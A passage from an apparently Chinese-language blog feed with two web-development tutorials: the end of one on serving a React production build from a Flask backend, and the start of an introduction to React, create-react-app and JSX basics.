operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span>  <span class="token comment"># 允许跨域请求</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-2-测试验证"><a href="#5-2-测试验证" class="headerlink" title="5.2 测试验证"></a>5.2 测试验证</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.59.41.png" alt="前后端联动测试成功" style="zoom:50%;"><h1 id="六、部署优化"><a href="#六、部署优化" class="headerlink" title="六、部署优化"></a>六、部署优化</h1><p><strong>开发环境</strong>：前后端分开运行。</p><p><strong>生产环境</strong>：可以使用 Flask 提供 React 构建后的静态文件。</p><h2 id="6-1-构建-React-项目"><a href="#6-1-构建-React-项目" class="headerlink" title="6.1 构建 React 项目"></a>6.1 构建 React 项目</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>输出：</p><p>npm run build </p><blockquote><p><a href="mailto:react-frontend@0.1.0">react-frontend@0.1.0</a> build<br>react-scripts build</p></blockquote><p>Creating an optimized production build…<br>One of your dependencies, babel-preset-react-app, is importing the<br>“@babel/plugin-proposal-private-property-in-object” package without<br>declaring it in its dependencies. This is currently working because<br>“@babel/plugin-proposal-private-property-in-object” is already in your<br>node_modules folder for unrelated reasons, but it may break at any time.</p><p>babel-preset-react-app is part of the create-react-app project, which<br>is not maintianed anymore. It is thus unlikely that this bug will<br>ever be fixed. Add “@babel/plugin-proposal-private-property-in-object” to<br>your devDependencies to work around this error. This will make this message<br>go away.</p><p>Compiled successfully.</p><p>File sizes after gzip:</p><p>  73.28 kB  build/static/js/main.7d3412ba.js<br>  2.7 kB    build/static/js/488.ee97bdc1.chunk.js<br>  264 B     build/static/css/main.e6c13ad2.css</p><p>The project was built assuming it is hosted at /.<br>You can control this with the homepage field in your package.json.</p><p>The build folder is ready to be deployed.<br>You may serve it with a static server:</p><p>  npm install -g serve<br>  serve -s build</p><p>Find out more about deployment here:</p><p>  <a href="https://cra.link/deployment">https://cra.link/deployment</a></p></blockquote><h2 id="6-2-设置-Flask-提供静态文件服务"><a href="#6-2-设置-Flask-提供静态文件服务" class="headerlink" title="6.2 设置 Flask 提供静态文件服务"></a>6.2 设置 Flask 提供静态文件服务</h2><h3 id="6-2-1-将-build-文件夹复制到-Flask-项目目录"><a href="#6-2-1-将-build-文件夹复制到-Flask-项目目录" class="headerlink" title="6.2.1 将 build 文件夹复制到 Flask 项目目录"></a>6.2.1 将 <code>build</code> 文件夹复制到 Flask 项目目录</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.06.17.png" alt="截屏2024-12-10 10.06.17" style="zoom:50%;"><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.08.24.png" alt="截屏2024-12-10 10.08.24"></p><h3 id="6-2-3-设置-Flask-提供静态文件服务"><a href="#6-2-3-设置-Flask-提供静态文件服务" class="headerlink" title="6.2.3 设置 Flask 提供静态文件服务"></a>6.2.3 设置 Flask 提供静态文件服务</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_from_directory<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">serve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>static_folder<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-2-4-访问测试"><a href="#6-2-4-访问测试" class="headerlink" title="6.2.4 访问测试"></a>6.2.4 访问测试</h3><p>启动 Flask 项目后，直接访问根路径 <code>http://127.0.0.1:5000</code>。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.15.20.png" style="zoom:50%;"><p>首页为空，静态资源下载失败。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.23.14.png" style="zoom:50%;"><h3 id="6-2-5-修改-package-json"><a href="#6-2-5-修改-package-json" class="headerlink" title="6.2.5 修改 package.json"></a>6.2.5 修改 <code>package.json</code></h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"homepage"</span><span class="token operator">:</span> <span class="token string">"."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.26.43.png" alt="截屏2024-12-10 10.26.43" style="zoom:50%;"><p>重新构建项目：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新测试：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.28.54.png" alt="截屏2024-12-10 10.28.54" style="zoom:50%;"><p>仍然失败。</p><h3 id="6-2-6-问题进一步分析"><a href="#6-2-6-问题进一步分析" class="headerlink" title="6.2.6 问题进一步分析"></a>6.2.6 问题进一步分析</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1:5000/build/static/css/main.e6c13ad2.css<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.31.55.png" alt="截屏2024-12-10 10.31.55" style="zoom:50%;"><p>添加build目录能够成功访问。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.35.37.png" style="zoom:50%;"><h3 id="6-2-7-问题解决"><a href="#6-2-7-问题解决" class="headerlink" title="6.2.7 问题解决"></a>6.2.7 问题解决</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_folder<span class="token operator">=</span><span class="token string">'build'</span><span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加配置：static_url_path=’’</p><h2 id="6-3-访问测试"><a href="#6-3-访问测试" class="headerlink" title="6.3 访问测试"></a>6.3 访问测试</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.38.20.png" style="zoom:50%;"><p>至此，成功完成一个Flask+React的Demo系统。</p><p>进阶技能，后续继续加以学习。</p><h1 id="目录结构总结"><a href="#目录结构总结" class="headerlink" title="目录结构总结"></a>目录结构总结</h1><p>前端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">react-frontend/├── public/├── src/│   ├── App.js│   ├── index.js├── package.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flask-backend/├── app.py├── venv/├── build/ <span class="token punctuation">(</span>React 构建的静态文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前后端开发 </tag>
            
            <tag> React和Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React前端框架</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="一、React介绍"><a href="#一、React介绍" class="headerlink" title="一、React介绍"></a>一、React介绍</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p><strong>React</strong> 是由 <strong>Meta（前 Facebook）</strong> 开发并开源的一个用于构建用户界面的 JavaScript 库，（可用于构建Web和原生交互界面）。它主要用于创建单页应用（SPA, Single Page Application），能够通过组件化的开发模式构建复杂的用户界面。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.23.55.png" style="zoom:30%;"><p>React 是现代前端开发中最流行的工具之一，凭借其高效的虚拟 DOM、组件化开发模式和强大的生态系统，成为构建用户界面的首选技术。无论是中小型项目还是复杂的大型应用，React 都能提供优雅的解决方案。</p><h2 id="1-2-优势"><a href="#1-2-优势" class="headerlink" title="1.2 优势"></a>1.2 优势</h2><p>相较于传统基于DOM开发的优势：</p><ol><li>组件化的开发方式</li><li>不错的性能</li></ol><p>相较于其它前端框架的优势</p><ol><li>丰富的生态</li><li>跨平台支持</li></ol><h2 id="1-3-React的市场情况"><a href="#1-3-React的市场情况" class="headerlink" title="1.3 React的市场情况"></a>1.3 React的市场情况</h2><p>全球最流行，大厂必备。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.25.19.png" style="zoom:20%;"><h1 id="二、开发环境搭建"><a href="#二、开发环境搭建" class="headerlink" title="二、开发环境搭建"></a>二、开发环境搭建</h1><h2 id="2-1-初始化react工程项目"><a href="#2-1-初始化react工程项目" class="headerlink" title="2.1 初始化react工程项目"></a>2.1 初始化react工程项目</h2><p>create-react-app是一个快速创建React开发环境的工具，底层由Webpack构件，封装了配置细节，开箱即用。</p><p>执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-basic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ol><li>npx -  Node.js工具命令，查找并执行后续的包命令</li><li>create-react-app - 核心包（固定写法），用于创建React项目</li><li>react-basic  React项目的名称（可以自定义）</li></ol></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> react-basic<span class="token function">npm</span> start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>bug解决：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.35.02.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> ajv@latest ajv-keywords@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.37.21.png" style="zoom:50%;"></blockquote><p>测试：npm start</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.37.50.png" style="zoom:30%;"><h2 id="2-2-关键文件"><a href="#2-2-关键文件" class="headerlink" title="2.2 关键文件"></a>2.2 关键文件</h2><h3 id="2-2-1-package-json"><a href="#2-2-1-package-json" class="headerlink" title="2.2.1 package.json"></a>2.2.1 package.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"react"</span><span class="token operator">:</span> <span class="token string">"^19.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"react-dom"</span><span class="token operator">:</span> <span class="token string">"^19.0.0"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"react-scripts start"</span><span class="token punctuation">,</span>    <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"react-scripts build"</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>react基础项目的核心依赖和核心脚本。</p><h3 id="2-2-2-src源码目录"><a href="#2-2-2-src源码目录" class="headerlink" title="2.2.2 src源码目录"></a>2.2.2 src源码目录</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.42.22.png" style="zoom:50%;"><p>除了高亮的两个文件，其他都可以删除。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.44.10.png" style="zoom:50%;"><ul><li><p>index.js清理</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./index.css'</span><span class="token punctuation">;</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token keyword">import</span> reportWebVitals <span class="token keyword">from</span> <span class="token string">'./reportWebVitals'</span><span class="token punctuation">;</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>  <span class="token operator">&lt;</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>App <span class="token operator">/</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>React<span class="token punctuation">.</span>StrictMode<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// If you want to start measuring performance in your app, pass a function</span><span class="token comment">// to log results (for example: reportWebVitals(console.log))</span><span class="token comment">// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals</span><span class="token function">reportWebVitals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>清理后：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">App</span></span> <span class="token punctuation">/&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>App.js清理</p></li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> logo <span class="token keyword">from</span> <span class="token string">'./logo.svg'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./App.css'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>logo<span class="token punctuation">}</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-logo<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">          Edit </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">src/App.js</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">&gt;</span></span><span class="token plain-text"> and save to reload.        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>          <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-link<span class="token punctuation">"</span></span>          <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://reactjs.org<span class="token punctuation">"</span></span>          <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span>          <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noopener noreferrer<span class="token punctuation">"</span></span>        <span class="token punctuation">&gt;</span></span><span class="token plain-text">          Learn React        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>清理后：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问测试：</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.50.58.png" style="zoom:50%;"><h2 id="2-3-渲染逻辑"><a href="#2-3-渲染逻辑" class="headerlink" title="2.3 渲染逻辑"></a>2.3 渲染逻辑</h2><h3 id="2-3-1-入口文件：index-js"><a href="#2-3-1-入口文件：index-js" class="headerlink" title="2.3.1 入口文件：index.js"></a>2.3.1 入口文件：index.js</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//项目的入口 从这里开始运行</span><span class="token comment">//react必要的两个核心包</span><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom/client'</span><span class="token punctuation">;</span><span class="token comment">//导入项目的根组件</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App'</span><span class="token punctuation">;</span><span class="token comment">//把App根组件渲染到id为root的dom节点上</span><span class="token keyword">const</span> root <span class="token operator">=</span> ReactDOM<span class="token punctuation">.</span><span class="token function">createRoot</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>root<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>App <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-2-id为root的dom节点"><a href="#2-3-2-id为root的dom节点" class="headerlink" title="2.3.2 id为root的dom节点"></a>2.3.2 id为root的dom节点</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2014.56.13.png" style="zoom:67%;"><h3 id="2-3-3-根组件"><a href="#2-3-3-根组件" class="headerlink" title="2.3.3 根组件"></a>2.3.3 根组件</h3><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">//项目的根组件</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-4-渲染流程"><a href="#2-3-4-渲染流程" class="headerlink" title="2.3.4 渲染流程"></a>2.3.4 渲染流程</h3><p>App根组件-&gt;index.js-&gt;public/index.html(root)</p><h1 id="三、JSX基础"><a href="#三、JSX基础" class="headerlink" title="三、JSX基础"></a>三、JSX基础</h1><h2 id="3-1-什么是JSX"><a href="#3-1-什么是JSX" class="headerlink" title="3.1 什么是JSX"></a>3.1 什么是JSX</h2><p>JSX是JavaScript和XMl(HTML)的缩写，表示在JS代码中编写HTML模版结构，它是React中构建UI的方式。</p><p>优势：结合HTML+JS</p><ol><li>HTML的声明式模版写法</li><li>JavaScript的可编程能力</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> message <span class="token operator">=</span> <span class="token string">'this is message'</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is title</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>message<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-JSX的本质"><a href="#3-2-JSX的本质" class="headerlink" title="3.2 JSX的本质"></a>3.2 JSX的本质</h2><p>JSX并不是标准的JS语法，它是 JS的语法扩展，浏览器本身不能识别，需要通过解析工具做解析之后才能在浏览器中使用。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.18.43.png" style="zoom:50%;"><p>Babel在线网站，在线将JSX编译成JS。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2015.19.06.png" style="zoom:50%;"><h2 id="3-3-JSX高频场景-JS表达式"><a href="#3-3-JSX高频场景-JS表达式" class="headerlink" title="3.3 JSX高频场景-JS表达式"></a>3.3 JSX高频场景-JS表达式</h2><p>在JSX中可以通过 <code>大括号语法{}</code> 识别JavaScript中的表达式，比如常见的变量、函数调用、方法调用等等。</p><ol><li>使用引号传递字符串</li><li>使用JS变量</li><li>函数调用和方法调用</li><li>使用JavaScript对象</li></ol><blockquote><p>注意：if语句、switch语句、变量声明不属于表达式，不能出现在{}中。</p></blockquote><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">//项目的根组件</span><span class="token keyword">function</span> <span class="token function">helloJsx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token string">"Hello Jsx!"</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> count<span class="token operator">=</span><span class="token number">99999</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        This is React App.        </span><span class="token punctuation">{</span><span class="token 